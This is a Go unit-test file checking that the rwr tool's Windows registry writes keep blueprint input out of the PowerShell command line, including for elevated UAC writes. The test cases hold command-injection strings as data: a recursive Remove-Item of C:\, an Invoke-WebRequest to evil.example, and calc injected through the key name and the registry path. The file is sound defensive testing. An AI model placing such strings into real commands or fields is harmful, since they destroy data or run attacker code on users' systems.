package processors

import (
	"encoding/base64"
	"strings"
	"testing"
	"unicode/utf16"

	"github.com/fynxlabs/rwr/internal/exectest"
	"github.com/fynxlabs/rwr/internal/system"
	"github.com/fynxlabs/rwr/internal/types"
)

// Registry values come from a blueprint. Anything interpolated into the string
// PowerShell parses after -Command is a second statement waiting to happen, so the
// argv must stay a fixed script and carry the data out-of-band.
func TestProcessWindowsRegistry_ValuesNeverReachTheCommandString(t *testing.T) {
	tests := []struct {
		name      string
		config    types.Configuration
		wantValue string
	}{
		{
			name: "single quote and semicolon in value",
			config: types.Configuration{
				Type:  "string",
				Path:  `SOFTWARE\rwr`,
				Key:   "Setting",
				Value: `a'; Remove-Item C:\ -Recurse -Force; #`,
			},
			wantValue: `a'; Remove-Item C:\ -Recurse -Force; #`,
		},
		{
			name: "subexpression in value",
			config: types.Configuration{
				Type:  "expandstring",
				Path:  `SOFTWARE\rwr`,
				Key:   "Setting",
				Value: `$(Invoke-WebRequest evil.example)`,
			},
			wantValue: `$(Invoke-WebRequest evil.example)`,
		},
		{
			name: "injection through the key name",
			config: types.Configuration{
				Type:  "string",
				Path:  `SOFTWARE\rwr`,
				Key:   `Name'; calc; #`,
				Value: "ok",
			},
			wantValue: "ok",
		},
		{
			name: "injection through the registry path",
			config: types.Configuration{
				Type:  "string",
				Path:  `SOFTWARE\rwr'; calc; #`,
				Key:   "Setting",
				Value: "ok",
			},
			wantValue: "ok",
		},
		{
			name: "dword given as a string still lands as a number",
			config: types.Configuration{
				Type:  "dword",
				Path:  `SOFTWARE\rwr`,
				Key:   "Setting",
				Value: "42",
			},
			wantValue: "42",
		},
		{
			name: "qword given as a yaml integer",
			config: types.Configuration{
				Type:  "qword",
				Path:  `SOFTWARE\rwr`,
				Key:   "Setting",
				Value: 7,
			},
			wantValue: "7",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rec := exectest.New()
			defer system.SetExecutor(rec)()

			if err := processWindowsRegistry(tt.config, &types.InitConfig{}); err != nil {
				t.Fatalf("processWindowsRegistry: %v", err)
			}

			if len(rec.Calls) != 1 {
				t.Fatalf("recorded %d calls, want 1: %v", len(rec.Calls), rec.Calls)
			}
			call := rec.Calls[0]

			if call.Exec != "powershell" {
				t.Errorf("Exec = %q, want powershell", call.Exec)
			}

			// The blueprint data must appear only in the environment, never in argv.
			for _, arg := range call.Args {
				for _, tainted := range []string{tt.config.Path, tt.config.Key} {
					if strings.Contains(arg, tainted) {
						t.Errorf("argv element %q contains blueprint input %q", arg, tainted)
					}
				}
				if s, ok := tt.config.Value.(string); ok && strings.Contains(arg, s) {
					t.Errorf("argv element %q contains blueprint value %q", arg, s)
				}
			}

			// Nothing may re-parse an already-built command string.
			for _, arg := range call.Args {
				if strings.Contains(arg, "Start-Process") {
					t.Errorf("argv still nests through Start-Process: %v", call.Args)
				}
			}

			if got := call.Vars[registryValueEnv]; got != tt.wantValue {
				t.Errorf("%s = %q, want %q", registryValueEnv, got, tt.wantValue)
			}
			if got, want := call.Vars[registryNameEnv], tt.config.Key; got != want {
				t.Errorf("%s = %q, want %q", registryNameEnv, got, want)
			}
			if got, want := call.Vars[registryPathEnv], `HKLM:\`+tt.config.Path; got != want {
				t.Errorf("%s = %q, want %q", registryPathEnv, got, want)
			}
		})
	}
}

// The elevated path used to wrap the whole command in
// `Start-Process -Verb RunAs -ArgumentList "-Command <string>"`, which handed the
// interpolated string to a second parser.
// Windows has no sudo, so elevated: true must still raise a UAC prompt. The
// injection fix removed the old Start-Process branch because it re-tokenized an
// already-built command string; this asserts elevation is back without that.
func TestProcessWindowsRegistry_ElevatedUsesRunAsWithoutReparsing(t *testing.T) {
	rec := exectest.New()
	defer system.SetExecutor(rec)()

	const attack = `a'; calc; #`
	config := types.Configuration{
		Type:     "string",
		Path:     `SOFTWARE\rwr`,
		Key:      "Setting",
		Value:    attack,
		Elevated: true,
	}
	if err := processWindowsRegistry(config, &types.InitConfig{}); err != nil {
		t.Fatalf("processWindowsRegistry: %v", err)
	}

	if len(rec.Calls) != 1 {
		t.Fatalf("expected one command, got %v", rec.Calls)
	}
	call := rec.Calls[0]
	joined := strings.Join(call.Argv(), " ")

	if !strings.Contains(joined, "Start-Process") || !strings.Contains(joined, "RunAs") {
		t.Errorf("elevated write does not raise a UAC prompt: %v", call.Argv())
	}

	// Nothing the blueprint supplied may appear in the command at any layer.
	for _, secret := range []string{attack, "calc", config.Key, config.Path} {
		if strings.Contains(joined, secret) {
			t.Errorf("blueprint input %q reached the command string: %v", secret, call.Argv())
		}
	}

	// The inner script is a constant plus rwr's own payload path; decoding it must
	// not reveal blueprint input either.
	encoded := ""
	for _, arg := range call.Args {
		if strings.HasPrefix(arg, "$p = Start-Process") {
			fields := strings.Split(arg, "'")
			for _, f := range fields {
				if len(f) > 40 && !strings.Contains(f, " ") {
					encoded = f
				}
			}
		}
	}
	if encoded == "" {
		t.Fatal("could not find the encoded inner script in the argv")
	}
	raw, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		t.Fatalf("inner script is not valid base64: %v", err)
	}
	units := make([]uint16, 0, len(raw)/2)
	for i := 0; i+1 < len(raw); i += 2 {
		units = append(units, uint16(raw[i])|uint16(raw[i+1])<<8)
	}
	inner := string(utf16.Decode(units))
	for _, secret := range []string{attack, "calc", config.Key, config.Path} {
		if strings.Contains(inner, secret) {
			t.Errorf("blueprint input %q reached the elevated script: %s", secret, inner)
		}
	}
	if !strings.Contains(inner, "ConvertFrom-Json") {
		t.Errorf("elevated script does not read its input as data: %s", inner)
	}
}

// %d against a YAML string used to write the literal text "%!d(string=high)" into
// the registry instead of failing.
func TestProcessWindowsRegistry_RejectsBadValues(t *testing.T) {
	tests := []struct {
		name   string
		config types.Configuration
	}{
		{"non-numeric dword", types.Configuration{Type: "dword", Key: "k", Value: "high"}},
		{"non-numeric qword", types.Configuration{Type: "qword", Key: "k", Value: "high"}},
		{"fractional dword", types.Configuration{Type: "dword", Key: "k", Value: 1.5}},
		{"non-string string value", types.Configuration{Type: "string", Key: "k", Value: 12}},
		{"binary from a string", types.Configuration{Type: "binary", Key: "k", Value: "nope"}},
		{"unsupported type", types.Configuration{Type: "reg_none", Key: "k", Value: "x"}},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rec := exectest.New()
			defer system.SetExecutor(rec)()

			err := processWindowsRegistry(tt.config, &types.InitConfig{})
			if err == nil {
				t.Fatal("expected an error, got nil")
			}
			if strings.Contains(err.Error(), "%!") {
				t.Errorf("error still carries a fmt verb failure: %v", err)
			}
			if len(rec.Calls) != 0 {
				t.Errorf("ran a command despite the invalid value: %v", rec.Calls)
			}
		})
	}
}
